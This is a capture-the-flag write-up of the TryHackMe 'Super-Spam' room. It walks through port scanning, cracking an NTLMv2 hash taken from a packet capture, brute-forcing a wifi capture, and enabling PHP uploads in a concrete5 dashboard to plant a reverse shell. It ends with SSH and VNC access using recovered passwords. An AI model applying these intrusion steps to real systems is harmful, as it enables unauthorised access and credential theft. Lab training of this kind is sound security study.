Super-Spam
![Pasted image 20210807230540](https://user-images.githubusercontent.com/5285547/128637165-5cf9e691-a7e7-410b-940f-3d4d2a9b9598.png)


Room Link: https://tryhackme.com/room/superspamr

Room info
General Uvilix:

Good Morning! Our intel tells us that he has returned. Super-spam, the evil alien villain from the planet Alpha Solaris IV from the outer reaches of the Andromeda Galaxy. He is a most wanted notorious cosmos hacker who has made it his lifetime mission to attack every Linux server possible on his journey to a Linux-free galaxy. As an avid Windows proponent, Super-spam has now arrived on Earth and has managed to hack into OUR Linux machine in pursuit of his ultimate goal. We must regain control of our server before it's too late! Find a way to hack back in to discover his next evil plan for total Windows domination! Beware, super-spam's evil powers are to confuse and deter his victims.

Credits: ARZ101, DrXploiter, Aksheet, kiwiness, wraith0p

Enum
IP
10.10.196.249
Nmap
PORT     STATE SERVICE
80/tcp   open  http
4012/tcp open  pda-gate
4019/tcp open  talarian-mcast5
5901/tcp open  vnc-1
6001/tcp open  X11:1
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: concrete5 - 8.5.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home :: Super-Spam
4012/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86:60:04:c0:a5:36:46:67:f5:c7:24:0f:df:d0:03:14 (RSA)
|   256 ce:d2:f6:ab:69:7f:aa:31:f5:49:70:e5:8f:62:b0:b7 (ECDSA)
|_  256 73:a0:a1:97:c4:33:fb:f4:4a:5c:77:f6:ac:95:76:ac (ED25519)
4019/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Feb 20 14:42 IDS_logs
|_-rw-r--r--    1 ftp      ftp           526 Feb 20 13:53 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.153.120
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
5901/tcp open  vnc     VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     VNC Authentication (2)
|     Tight (16)
|   Tight auth subtypes: 
|_    STDV VNCAUTH_ (2)
6001/tcp open  X11     (access denied)
FTP
ftp IP 4019 
anonymous login
Looking in the ftp server we find a note and some files to inspect with wireshark,
Let's get the files on our box to investigate further.

wget -r ftp://anonymous:@IP:4019/
note.txt

12th January: Note to self. Our IDS seems to be experiencing high volumes of unusual activity.
We need to contact our security consultants as soon as possible. I fear something bad is going
to happen. -adam

13th January: We've included the wireshark files to log all of the unusual activity. It keeps
occuring during midnight. I am not sure why.. This is very odd... -adam

15th January: I could swear I created a new blog just yesterday. For some reason it is gone... -adam

24th January: Of course it is... - super-spam :)

pcap files

Opening the files in wireshark didn't show much at first apart from what looked to be a crsf test and a smb login. I didn't know how to get the smb login infomation so googled until I found this helpful article: https://research.801labs.org/cracking-an-ntlmv2-hash/

14-01.-21.pcap - this file had the sessions login detils inside (NTLMv2)

Extract.

Filter by ntlmssp to get the authentication handshake

Find the NTLMSSP_AUTH packet
![Pasted image 20210808010156](https://user-images.githubusercontent.com/5285547/128637174-28376fc4-67dd-4e9b-ae08-ea83d62527d1.png)

Copy the domain name and user name to a text file

In NTLM Response section, find NTProofStr and NTLMv2 response, copy both of these as hex stream
![Pasted image 20210808010437](https://user-images.githubusercontent.com/5285547/128637176-df372ff3-db4e-4114-b0b4-aebbd3d10574.png)

Domain name: 3B

User name: lgreen

ServerChallange: a2cce5d65c5fc02f

NTProofStr: 73aeb418ae0e8a9ec167c4d0880cfe22

NTLMv2 Response: 73aeb418ae0e8a9ec167c4d0880cfe22010100000000000049143c43a261d6012ce41adf31a1363c00000000020004003300420001001e003000310035003600360053002d00570049004e00310036002d004900520004001e0074006800720065006500620065006500730063006f002e0063006f006d0003003e003000310035003600360073002d00770069006e00310036002d00690072002e0074006800720065006500620065006500730063006f002e0063006f006d0005001e0074006800720065006500620065006500730063006f002e0063006f006d000700080049143c43a261d60106000400020000000800300030000000000000000100000000200000fc849ef6b042cb4e368a3cbbd2362b5ccc39324c75df3415b6166d7489ad1d2b0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e00360036002e0033003600000000000000000000000000
Notice that NTLMv2Response begins with the ntlmProofStr, delete the ntlmProofStr from the NTLMv2Response
Enter ntlmssp.ntlmserverchallenge into the search filter. Copy this value to the text document as a Hex stream
![Pasted image 20210808010919](https://user-images.githubusercontent.com/5285547/128637179-ed716614-6fae-4a49-afc6-2fc64eaf385b.png)

Put the values in the following format and save as hash.txt

username::domain:ServerChallange:NTproofstring:modifiedntlmv2response
lgreen::3B:a2cce5d65c5fc02f:73aeb418ae0e8a9ec167c4d0880cfe22:010100000000000049143c43a261d6012ce41adf31a1363c00000000020004003300420001001e003000310035003600360053002d00570049004e00310036002d004900520004001e0074006800720065006500620065006500730063006f002e0063006f006d0003003e003000310035003600360073002d00770069006e00310036002d00690072002e0074006800720065006500620065006500730063006f002e0063006f006d0005001e0074006800720065006500620065006500730063006f002e0063006f006d000700080049143c43a261d60106000400020000000800300030000000000000000100000000200000fc849ef6b042cb4e368a3cbbd2362b5ccc39324c75df3415b6166d7489ad1d2b0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e00360036002e0033003600000000000000000000000000
Time to crack the password!

hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -O    
Now we have a username and password. Lets see where we can use them too.

lgreen:P@$$w0rd
.cap/
.quicknote
![Pasted image 20210808143023](https://user-images.githubusercontent.com/5285547/128637184-a77bd0cf-24ca-41f5-8ace-0267631f414d.png)

SamsNetework.cap
This file seems to hold attack data from a wifi attack. Let's see if we can brute it.

aircrack-ng SamsNetwork.cap -w /usr/share/wordlists/rockyou.txt
![Pasted image 20210808143350](https://user-images.githubusercontent.com/5285547/128637186-958557fd-0487-483b-ba45-40433fc36bc7.png)

Webapp (concrete5)
home page
![Pasted image 20210807232144](https://user-images.githubusercontent.com/5285547/128637190-9ef8439b-7b7f-4001-a7e7-bb4ec3cbb1c1.png)
![Pasted image 20210807232212](https://user-images.githubusercontent.com/5285547/128637191-9005a6a5-93d0-4eeb-b805-90b7ff5e43c1.png)

login page
![Pasted image 20210808031710](https://user-images.githubusercontent.com/5285547/128637197-905f498c-1ada-4d80-9f8f-e8bbe84d6577.png)

Users found.

Benjamin_Blogger
Lucy_Loser
Adam_Admin
Donald_Dump
lgreen
Passwords found.

P@$$w0rd
sandiago
Website login

Donald_Dump:sandiago
Loggin in shows a website error

![Pasted image 20210808145935](https://user-images.githubusercontent.com/5285547/128637228-2806ce9a-876e-4bf9-9de5-8a6ad147003c.png)

Chaning the URL we can see the full dashboard.

http://10.10.113.206/concrete5/index.php/dashboard/welcome
http://10.10.113.206/concrete5/index.php/dashboard #take welcome of the end
Goto allowed file types and edit to include php

![Pasted image 20210808150117](https://user-images.githubusercontent.com/5285547/128637232-282a0163-c054-4195-ae81-e9636b413020.png)

Then in Files upload a PHP reverse shell and then catch the shell with a netcat listner

http://10.10.113.206/concrete5/application/files/7616/2843/1779/shell.php
![Pasted image 20210808151039](https://user-images.githubusercontent.com/5285547/128637253-0ee5e743-1b9e-4f8e-9c2f-8c65b99ab534.png)

Now you can get the user.flag in /home/personal/Work/flag.txt

Donald (user 1)
Looking around the system, we can see the user lucy has some intresting files in her home directory.

![Pasted image 20210808160810](https://user-images.githubusercontent.com/5285547/128637259-f6e612c4-7157-4c4c-98df-1468cbfecb8e.png)

note.txt

Note to self. General super spam mentioned that I should not make the same mistake again of re-using the same key for the XOR encryption of our messages to Alpha Solaris IV's headquarters, otherwise we could have some serious issues if our encrypted messages are compromised. I must keep reminding myself,do not re-use keys,I have done it 8 times already!.The most important messages we sent to the HQ were the first and eighth message.I hope they arrived safely.They are crucial to our end goal.
![Pasted image 20210808160752](https://user-images.githubusercontent.com/5285547/128637262-903defdd-0711-404c-b71a-179da39e548f.png)

In the image you can just see the password without needing to reverse the xor reoutine.

ssh donalddump@10.10.119.165 -p 4012 
$$L3qwert30kcool
Root
Logging back in as donald we need to edit the permission on his home folder to access it.

chmod 777 donalddump
cd donalddump

![Pasted image 20210808162005](https://user-images.githubusercontent.com/5285547/128637266-9dd99a37-c611-477f-9482-bb91c40fa440.png)


The passwd file is a vncviewer password. Let's use it!

vncviewer -passwd passwd 10.10.119.165::5901
![Pasted image 20210808162048](https://user-images.githubusercontent.com/5285547/128637267-d062fb59-7c02-4c06-93d3-687c5ff66dbe.png)

echo MZWGCZ33NF2GKZKLMRRHKPJ5NBVEWNWCU5MXKVLVG4WTMTS7PU======|base64 -d

Gives the final flag
This is not over! You may have saved your beloved planet this time, Hacker-man, but I will be back w
